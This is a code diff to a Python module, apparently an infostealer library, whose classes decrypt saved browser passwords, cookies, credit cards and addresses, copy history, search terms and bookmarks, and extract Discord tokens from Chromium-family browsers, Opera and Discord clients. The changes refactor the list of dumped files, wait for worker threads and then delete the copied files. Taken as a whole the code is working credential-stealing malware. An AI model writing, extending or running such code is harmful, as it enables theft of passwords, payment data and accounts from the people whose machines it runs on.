@@ -8,7 +8,6 @@ import sqlite3
 import shutil
 import base64
 import json
-import time
 import re
 import os
 
@@ -61,7 +60,7 @@ class BrowserTools:
     def __init__(self, dir=None, localstate=None):
         self.path = dir
         self.localstate = localstate
-        self.dump_files = []
+        self.__dump_files = []
     
     def get_master_key(self, localstate=None):
         with open(self.localstate if localstate is None else localstate, 'r', encoding='utf-8') as file:
@@ -80,7 +79,7 @@ class BrowserTools:
             'discordcanary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
             'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
             'discordptb': roaming + '\\discordptb\\Local Storage\\leveldb\\'
-        }.items() if os.path.exists(p)}
+        }.items() if path_exists(p)}
 
         discord_tokens = []
         for browser, path in paths.items():
@@ -95,7 +94,7 @@ class BrowserTools:
                         
                         for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                             localstate = f"{roaming}\\{browser}\\Local State"
-                            if not os.path.exists(localstate): continue
+                            if not path_exists(localstate): continue
                             token = self.decrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(localstate))
 
                             if not self.__validate_discord_token(token): continue
@@ -122,8 +121,8 @@ class BrowserTools:
         cursor.close()
         conn.close()
 
-        self.dump_files.append(cookie_file)
-        self.dump_files.append(db_file)
+        self.__dump_files.append(cookie_file)
+        self.__dump_files.append(db_file)
     
     def login_data(self, login_file):
         db_file = self.path + "\\Login Data.db"
@@ -135,13 +134,12 @@ class BrowserTools:
         cursor = conn.cursor()
 
         with open(raw_login_data, 'wb') as f:
-            f.write(json.dumps([[res[0], res[1], self.decrypt(res[2], key)] for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall() if res[0] != "" and res[1] != "" and res[2] != ""], indent=4).encode("utf8"))
+            f.write(json.dumps([{"url" :res[0], "username": res[1], "passowrd": self.decrypt(res[2], key)} for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall() if res[0] != "" and res[1] != "" and res[2] != ""], indent=4).encode("utf8"))
         cursor.close()
         conn.close()
 
-        if login_file not in self.dump_files:
-            self.dump_files.append(login_file)
-        self.dump_files.append(db_file)
+        self.__dump_files.append(login_file)
+        self.__dump_files.append(db_file)
 
     def web_data(self, webdata_file):
         self.credit_cards(webdata_file)
@@ -172,9 +170,8 @@ class BrowserTools:
         cursor.close()
         conn.close()
 
-        if webdata_file not in self.dump_files:
-            self.dump_files.append(webdata_file)
-        self.dump_files.append(db_file)
+        self.__dump_files.append(webdata_file)
+        self.__dump_files.append(db_file)
     
     def addresses(self, webdata_file):
         db_file = self.path + "\\Addresses.db"
@@ -210,13 +207,13 @@ class BrowserTools:
         cursor.close()
         conn.close()
 
-        if webdata_file not in self.dump_files:
-            self.dump_files.append(webdata_file)
-        self.dump_files.append(db_file)
+        self.__dump_files.append(webdata_file)
+        self.__dump_files.append(db_file)
 
     def bookmarks(self, bookmarks_file):
         with open(os.path.join(self.path, "bookmarks.txt"), "wb") as jsonfile:
             jsonfile.write(json.dumps([bookmark["url"] for bookmark in json.load(open(bookmarks_file))["roots"]["bookmark_bar"]["children"]], indent=4).encode('utf8'))
+        self.__dump_files.append(bookmarks_file)
 
     def history(self, history_file):
         self.web_history(history_file)
@@ -236,10 +233,9 @@ class BrowserTools:
             f.write(json.dumps([{"title": site[0], "url": site[1], "visit count": site[2]} for site in sites], indent=4).encode('utf8'))
         cursor.close()
         conn.close()
-        
-        if history_file not in self.dump_files:
-            self.dump_files.append(history_file)
-        self.dump_files.append(db_file)
+
+        self.__dump_files.append(history_file)
+        self.__dump_files.append(db_file)
 
     def search_history(self, history_file):
         db_file = self.path + "\\Search History.db"
@@ -250,13 +246,13 @@ class BrowserTools:
         cursor = conn.cursor()
 
         with open(raw_history_file, "wb") as f:
-            f.write(json.dumps([res[0] for res in cursor.execute("SELECT term FROM keyword_search_terms;").fetchall() if res[0] == ""], indent=4).encode("utf8"))
+            jsondata = json.dumps([res[0] for res in cursor.execute("SELECT term FROM keyword_search_terms;").fetchall() if res[0] == ""], indent=4).encode("utf8")
+            if jsondata != b'[]': f.write(jsondata)
         cursor.close()
         conn.close()
 
-        if history_file not in self.dump_files:
-            self.dump_files.append(history_file)
-        self.dump_files.append(db_file)
+        self.__dump_files.append(history_file)
+        self.__dump_files.append(db_file)
 
     def collect(self, LoginData="", WebData="", Cookies="", History="", Bookmarks=""):
         threads = []
@@ -277,16 +273,22 @@ class BrowserTools:
 
         for thread in threads: 
             thread.start()
+        
+        for thread in threads:
+            thread.join()
+        
+        self.dump_files()
     
-    def cleanup_dump(self):
-        for file in self.dump_files:
-            os.remove(file)
-        self.dump_files.clear()
+    def dump_files(self):
+        for thread in [threading.Thread(target=os.remove, args=(file,)) for file in [*set(self.__dump_files)] if path_exists(file)]:
+            thread.start()
 
 class Browsers:
-    def __init__(self, temp):
+    def __init__(self, temp: TemporaryDirectory):
         if not isinstance(temp, TemporaryDirectory):
             raise ValueError("Expected a damuffin.TemporaryDirectory.")
+
+        self.temp = temp
 
         self.browers = {
             k: v for k, v in {
@@ -308,7 +310,7 @@ class Browsers:
                 'iridium': localdata + '\\Iridium\\User Data',
                 'opera': roaming + '\\Opera Software\\Opera Stable',
                 'opera gx': roaming + '\\Opera Software\\Opera GX Stable'
-        }.items() if os.path.exists(v)}
+        }.items() if path_exists(v)}
 
         profiles = ["\\Default", "\\Profile 1", "\\Profile 2", "\\Profile 3", "\\Profile 4", "\\Profile 5"]
         files = ["\\Web Data", "\\Login Data", "\\Network\\Cookies", "\\History", "\\Bookmarks"]
@@ -330,12 +332,15 @@ class Browsers:
                     tools.path = pfolder
                     os.mkdir(pfolder)
 
-                    local_copies = {x: os.path.join(folder, os.path.basename(x)) for x in profile[-1]}
+                    local_copies = {x: os.path.join(pfolder, os.path.basename(x)) for x in profile[-1]}
+                    print(local_copies)
                     for x, c in local_copies.items():
-                        mkfile(c); shutil.copy2(x, c)
-                    tools.collect(**{os.path.basename(_).replace(" ", ""): _ for _ in local_copies})
+                        mkfile(c)
+                        shutil.copy2(x, c)
+                    tools.collect(**{os.path.basename(_).replace(" ", ""): _ for x, _ in local_copies.items()})
             elif isinstance(p, (tuple, set)):
                 local_copies = {x: os.path.join(folder, os.path.basename(x)) for x in p}
                 for x, c in local_copies.items():
-                    mkfile(c); shutil.copy2(x, c)
-                tools.collect(**{os.path.basename(_).replace(" ", ""): _ for _ in local_copies})
+                    mkfile(c) 
+                    shutil.copy2(x, c)
+                tools.collect(**{os.path.basename(_).replace(" ", ""): _ for x, _ in local_copies.items()})
